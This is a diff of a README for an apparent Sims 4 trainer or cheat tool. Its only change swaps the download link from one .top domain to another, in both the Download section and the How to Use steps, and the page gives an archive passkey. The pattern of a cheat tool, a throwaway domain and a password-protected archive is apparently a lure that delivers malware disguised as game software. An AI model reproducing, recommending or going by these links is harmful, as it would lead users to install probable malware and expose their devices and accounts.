@@ -6,7 +6,7 @@ The Sims 4 trainer with infinite money, unlock all items, cheats menu, and build
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitdownapply.top/)**
 
 Archive passkey: `Github`
 
@@ -78,7 +78,7 @@ Archive passkey: `Github`
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappdown.top/)** to download.
+1. Click **[CLICK](https://gitdownapply.top/)** to download.
 
 2. Extract the archive.
 
